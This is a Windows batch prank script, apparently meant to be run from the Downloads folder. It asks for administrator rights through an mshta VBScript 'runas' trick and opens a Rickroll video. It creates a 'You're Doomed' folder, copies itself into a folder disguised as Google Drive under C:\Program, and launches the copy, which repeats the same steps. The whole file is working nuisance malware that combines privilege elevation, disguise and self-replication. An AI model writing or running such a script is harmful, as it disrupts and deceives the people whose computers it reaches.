@echo off
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
cd /d "%~dp0"



start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ

mkdir "You're Doomed"

cd C:\

mkdir C:\Program\Google_Drive\

COPY C:\Users\%USERNAME%\Downloads\runthis.bat C:\Program\Google_Drive\runthis.bat

start C:\Program\Google_Drive\runthis.bat


pause
